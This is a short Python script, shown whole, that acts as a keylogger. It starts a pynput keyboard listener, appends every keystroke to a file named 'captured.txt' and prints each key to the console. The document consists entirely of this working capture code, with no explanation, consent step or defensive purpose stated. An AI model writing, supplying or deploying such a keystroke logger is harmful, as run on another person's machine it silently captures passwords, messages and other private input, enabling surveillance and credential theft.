#!/usr/bin/env python3

from pynput import keyboard

def on_press(key):
    with open('captured.txt', 'a') as f:
        if str(key) == 'Key.space':
            key = ' '
        f.write(f'{str(key).strip("''")}')
        print(f"{key}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
